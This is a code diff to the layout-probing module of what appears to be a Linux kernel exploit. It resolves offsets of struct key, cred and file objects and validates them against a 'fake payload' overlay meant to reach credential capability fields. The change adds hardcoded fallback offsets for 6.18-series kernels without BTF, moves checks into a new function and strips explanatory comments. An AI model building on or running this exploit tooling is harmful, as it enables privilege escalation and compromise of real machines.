@@ -6,11 +6,46 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/utsname.h>
 
 #include "btf.h"
 #include "target_hardened.h"
 
 struct k2_layout k2l;
+
+/*
+ * Fallback offsets for kernels without BTF, matched on the release prefix.
+ * Everything here was derived from a real page dump on that kernel; the
+ * K2_OFF_* environment wins over the table, BTF wins over both.
+ */
+struct k2_layout_default {
+    const char *release_prefix;
+    unsigned int key_user, key_expiry, key_last_used, key_uid, key_gid,
+                 key_perm, key_quotalen, key_desc_len, key_state, key_flags,
+                 key_hash, key_x, key_type, key_domain, key_description,
+                 key_keys_root;
+    unsigned int cred_securebits, cred_cap_permitted, cred_cap_effective;
+    unsigned int ku_qnkeys, ku_qnbytes;
+    unsigned int file_cred;
+    unsigned int node_slots;
+};
+
+static const struct k2_layout_default k2_layout_defaults[] = {
+    /* 6.18.60-instabox: provisional, confirm with K2_DUMP=keys analysis */
+    {
+        .release_prefix = "6.18.",
+        .key_user = 0x40, .key_expiry = 0x48, .key_last_used = 0x50,
+        .key_uid = 0x58, .key_gid = 0x5c, .key_perm = 0x60,
+        .key_quotalen = 0x64, .key_desc_len = 0x66, .key_state = 0x68,
+        .key_flags = 0x70, .key_hash = 0x78, .key_x = 0x80,
+        .key_type = 0x88, .key_domain = 0x90, .key_description = 0x98,
+        .key_keys_root = 0xb0,
+        .cred_securebits = 0x28, .cred_cap_permitted = 0x34,
+        .cred_cap_effective = 0x3c,
+        .ku_qnkeys = 0x44, .ku_qnbytes = 0x48,
+        .file_cred = 0x30, .node_slots = 16,
+    },
+};
 
 struct member_req {
     const char *const *aliases;
@@ -89,8 +124,10 @@ static const struct env_req overrides[] = {
     {"K2_OFF_NODE_SLOTS", &k2l.node_slots},
 };
 
-static void apply_overrides(void)
+static bool apply_overrides(void)
 {
+    bool any = false;
+
     for (size_t i = 0; i < sizeof(overrides) / sizeof(overrides[0]); i++) {
         const char *text = getenv(overrides[i].name);
         char *end;
@@ -105,7 +142,57 @@ static void apply_overrides(void)
             continue;
         }
         *overrides[i].out = (unsigned int)value;
+        any = true;
     }
+    return any;
+}
+
+/* Release-matched defaults for kernels without BTF. */
+static bool apply_defaults(void)
+{
+    struct utsname uts;
+
+    if (uname(&uts) != 0)
+        return false;
+    for (size_t i = 0; i < sizeof(k2_layout_defaults) /
+                               sizeof(k2_layout_defaults[0]); i++) {
+        const struct k2_layout_default *d = &k2_layout_defaults[i];
+
+        if (strncmp(uts.release, d->release_prefix,
+                    strlen(d->release_prefix)) != 0)
+            continue;
+        k2l.key_usage = 0;
+        k2l.key_serial = 4;
+        k2l.key_user = d->key_user;
+        k2l.key_expiry = d->key_expiry;
+        k2l.key_last_used = d->key_last_used;
+        k2l.key_uid = d->key_uid;
+        k2l.key_gid = d->key_gid;
+        k2l.key_perm = d->key_perm;
+        k2l.key_quotalen = d->key_quotalen;
+        k2l.key_desc_len = d->key_desc_len;
+        k2l.key_state = d->key_state;
+        k2l.key_flags = d->key_flags;
+        k2l.key_hash = d->key_hash;
+        k2l.key_x = d->key_x;
+        k2l.key_type = d->key_type;
+        k2l.key_domain = d->key_domain;
+        k2l.key_description = d->key_description;
+        k2l.key_keys_root = d->key_keys_root;
+        k2l.cred_securebits = d->cred_securebits;
+        k2l.cred_cap_permitted = d->cred_cap_permitted;
+        k2l.cred_cap_effective = d->cred_cap_effective;
+        k2l.ku_qnkeys = d->ku_qnkeys;
+        k2l.ku_qnbytes = d->ku_qnbytes;
+        k2l.file_cred = d->file_cred;
+        k2l.node_slots = d->node_slots;
+        k2l.key_size = 0xd0;
+        k2l.file_size = 0xb0;
+        k2l.file_stride = align_up(k2l.file_size, 64);
+        printf("K2_LAYOUT table=release:%s (provisional)\n", uts.release);
+        return true;
+    }
+    return false;
 }
 
 /*
@@ -137,6 +224,69 @@ static int resolve_desc_len(btf_id_t key, btf_id_t index_type)
         return 0;
     }
     return -ENOENT;
+}
+
+static int finish_probe(void)
+{
+    if (!k2l.key_user || !k2l.cred_cap_effective || !k2l.ku_qnbytes ||
+        !k2l.node_slots) {
+        fprintf(stderr, "K2_LAYOUT incomplete (no BTF, no table, no K2_OFF_*)\n");
+        return -ENODATA;
+    }
+    if (!k2l.file_stride)
+        k2l.file_stride = align_up(k2l.file_size ? k2l.file_size : 192, 64);
+    if (!k2l.files_per_slab)
+        k2l.files_per_slab = 4096 / k2l.file_stride;
+    if (k2l.files_per_slab > H_FILES_MAX)
+        k2l.files_per_slab = H_FILES_MAX;
+    k2l.key_usage = k2l.key_usage ? k2l.key_usage : 0;
+    k2l.key_serial = 4;
+    if (btf_enum_value("key_flag", "KEY_FLAG_IN_QUOTA", &k2l.flag_in_quota))
+        k2l.flag_in_quota = 2;
+    if (btf_enum_value("key_flag", "KEY_FLAG_USER_ALIVE",
+                       &k2l.flag_user_alive))
+        k2l.flag_user_alive = 10;
+    if (k2l.node_slots < 8 || k2l.node_slots > 128 ||
+        k2l.files_per_slab < 4)
+        return -EINVAL;
+    if (k2l.key_user >= H_DIRECT_FAKE_BYTES ||
+        k2l.key_flags >= H_DIRECT_FAKE_BYTES ||
+        k2l.key_description >= H_DIRECT_FAKE_BYTES ||
+        k2l.key_desc_len >= H_DIRECT_FAKE_BYTES)
+        return -E2BIG;
+
+    report_field("key.usage", k2l.key_usage);
+    report_field("key.serial", k2l.key_serial);
+    report_field("key.user", k2l.key_user);
+    report_field("key.expiry", k2l.key_expiry);
+    report_field("key.last_used_at", k2l.key_last_used);
+    report_field("key.uid", k2l.key_uid);
+    report_field("key.perm", k2l.key_perm);
+    report_field("key.quotalen", k2l.key_quotalen);
+    report_field("key.desc_len", k2l.key_desc_len);
+    report_field("key.state", k2l.key_state);
+    report_field("key.flags", k2l.key_flags);
+    report_field("key.hash", k2l.key_hash);
+    report_field("key.x", k2l.key_x);
+    report_field("key.type", k2l.key_type);
+    report_field("key.domain_tag", k2l.key_domain);
+    report_field("key.description", k2l.key_description);
+    report_field("key.keys_root", k2l.key_keys_root);
+    report_field("key.size", k2l.key_size);
+    report_field("cred.securebits", k2l.cred_securebits);
+    report_field("cred.cap_permitted", k2l.cred_cap_permitted);
+    report_field("cred.cap_effective", k2l.cred_cap_effective);
+    report_field("key_user.qnkeys", k2l.ku_qnkeys);
+    report_field("key_user.qnbytes", k2l.ku_qnbytes);
+    report_field("file.size", k2l.file_size);
+    report_field("file.stride", k2l.file_stride);
+    report_field("file.f_cred", k2l.file_cred);
+    report_field("file.objects_per_slab", k2l.files_per_slab);
+    report_field("node.slots", k2l.node_slots);
+    report_field("key_flag.in_quota", k2l.flag_in_quota);
+    report_field("key_flag.user_alive", k2l.flag_user_alive);
+    printf("K2_LAYOUT layout_source=%s\n", k2l.layout_source);
+    return 0;
 }
 
 int k2_layout_probe(void)
@@ -174,15 +324,16 @@ int k2_layout_probe(void)
     if (k2l.key_user)
         return 0;
     if (btf_open() != 0) {
-        snprintf(k2l.layout_source, sizeof(k2l.layout_source), "env");
-        fprintf(stderr, "K2_LAYOUT no BTF, K2_OFF_* overrides required\n");
-        apply_overrides();
-        if (!k2l.key_user || !k2l.cred_cap_effective || !k2l.ku_qnbytes ||
-            !k2l.node_slots) {
-            fprintf(stderr, "K2_LAYOUT incomplete without BTF\n");
+        bool overridden;
+
+        snprintf(k2l.layout_source, sizeof(k2l.layout_source), "fallback");
+        fprintf(stderr, "K2_LAYOUT no BTF, trying release table / K2_OFF_*\n");
+        overridden = apply_overrides();
+        if (!overridden && !apply_defaults()) {
+            fprintf(stderr, "K2_LAYOUT no table entry for this release\n");
             return -ENODATA;
         }
-        goto validate;
+        return finish_probe();
     }
     snprintf(k2l.layout_source, sizeof(k2l.layout_source), "btf");
 
@@ -193,7 +344,7 @@ int k2_layout_probe(void)
     node = btf_find_struct("assoc_array_node");
     payload = btf_find_struct("user_key_payload");
     if (key < 0 || cred < 0 || key_user < 0 || file < 0 || node < 0) {
-        fprintf(stderr, "K2_LAYOUT btf type lookup: key=%d cred=%d key_user=%d"
+        fprintf(stderr, "K2_LAYOUT btf lookup: key=%d cred=%d key_user=%d"
                 " file=%d node=%d payload=%d\n", key, cred, key_user, file,
                 node, payload);
         return -ENOENT;
@@ -271,8 +422,7 @@ int k2_layout_probe(void)
         if (rc)
             return rc;
         if (btf_member_size(key_user, "qnbytes", &width) != 0 || width != 4) {
-            fprintf(stderr, "K2_LAYOUT key_user.qnbytes width=%u (need 4)\n",
-                    width);
+            fprintf(stderr, "K2_LAYOUT qnbytes width=%u (need 4)\n", width);
             return -EINVAL;
         }
     }
@@ -305,82 +455,13 @@ int k2_layout_probe(void)
         size == H_USER_PAYLOAD_HEADER)
         k2l.payload_header = size;
 
-validate:
     apply_overrides();
-    if (!k2l.payload_header)
-        k2l.payload_header = H_USER_PAYLOAD_HEADER;
-    if (!k2l.file_stride)
-        k2l.file_stride = align_up(k2l.file_size ? k2l.file_size : 192, 64);
-    if (!k2l.files_per_slab)
-        k2l.files_per_slab = 4096 / k2l.file_stride;
-    if (k2l.files_per_slab > H_FILES_MAX)
-        k2l.files_per_slab = H_FILES_MAX;
-
-    if (btf_enum_value("key_flag", "KEY_FLAG_IN_QUOTA", &k2l.flag_in_quota))
-        k2l.flag_in_quota = 2;
-    if (btf_enum_value("key_flag", "KEY_FLAG_USER_ALIVE",
-                       &k2l.flag_user_alive))
-        k2l.flag_user_alive = 10;
-
-    /*
-     * The fake overlay and the workers address key.usage at 0 and key.serial
-     * at 4 unconditionally.
-     */
     if (k2l.key_usage != 0 || k2l.key_serial != 4) {
         fprintf(stderr, "K2_LAYOUT unsupported key prefix usage=%#x serial=%#x"
                 " (need 0/4)\n", k2l.key_usage, k2l.key_serial);
         return -ENOTSUP;
     }
-    if (k2l.node_slots < 8 || k2l.node_slots > 128) {
-        fprintf(stderr, "K2_LAYOUT node.slots=%u\n", k2l.node_slots);
-        return -EINVAL;
-    }
-    if (k2l.files_per_slab < 4) {
-        fprintf(stderr, "K2_LAYOUT filp objects_per_slab=%u\n",
-                k2l.files_per_slab);
-        return -EINVAL;
-    }
-    if (k2l.key_user >= H_DIRECT_FAKE_BYTES ||
-        k2l.key_flags >= H_DIRECT_FAKE_BYTES ||
-        k2l.key_description >= H_DIRECT_FAKE_BYTES ||
-        k2l.key_desc_len >= H_DIRECT_FAKE_BYTES) {
-        fprintf(stderr, "K2_LAYOUT key layout exceeds the fake payload\n");
-        return -E2BIG;
-    }
-
-    report_field("key.usage", k2l.key_usage);
-    report_field("key.serial", k2l.key_serial);
-    report_field("key.user", k2l.key_user);
-    report_field("key.expiry", k2l.key_expiry);
-    report_field("key.last_used_at", k2l.key_last_used);
-    report_field("key.uid", k2l.key_uid);
-    report_field("key.perm", k2l.key_perm);
-    report_field("key.quotalen", k2l.key_quotalen);
-    report_field("key.desc_len", k2l.key_desc_len);
-    report_field("key.state", k2l.key_state);
-    report_field("key.flags", k2l.key_flags);
-    report_field("key.hash", k2l.key_hash);
-    report_field("key.x", k2l.key_x);
-    report_field("key.type", k2l.key_type);
-    report_field("key.domain_tag", k2l.key_domain);
-    report_field("key.description", k2l.key_description);
-    report_field("key.keys_root", k2l.key_keys_root);
-    report_field("key.size", k2l.key_size);
-    report_field("cred.securebits", k2l.cred_securebits);
-    report_field("cred.cap_permitted", k2l.cred_cap_permitted);
-    report_field("cred.cap_effective", k2l.cred_cap_effective);
-    report_field("key_user.lock", k2l.ku_lock);
-    report_field("key_user.qnkeys", k2l.ku_qnkeys);
-    report_field("key_user.qnbytes", k2l.ku_qnbytes);
-    report_field("file.size", k2l.file_size);
-    report_field("file.stride", k2l.file_stride);
-    report_field("file.f_cred", k2l.file_cred);
-    report_field("file.objects_per_slab", k2l.files_per_slab);
-    report_field("node.slots", k2l.node_slots);
-    report_field("key_flag.in_quota", k2l.flag_in_quota);
-    report_field("key_flag.user_alive", k2l.flag_user_alive);
-    printf("K2_LAYOUT layout_source=%s\n", k2l.layout_source);
-    return 0;
+    return finish_probe();
 }
 
 /*
@@ -437,12 +518,6 @@ int k2_layout_finish(uint64_t page_base)
     }
 #undef CONSIDER
 
-    /*
-     * Pick the last node slot that still ends at or before key.user, so the
-     * slot value survives the field programming.  The original harness needed
-     * exactly that one (slot 5 at offset 56, user at 64); the rest is layout
-     * dependent.  Bits 4..7 and 8..11 both index this slot.
-     */
     for (unsigned int slot = 0; slot < 16; slot++) {
         unsigned int window = k2l.node_slots + slot * 8;
 
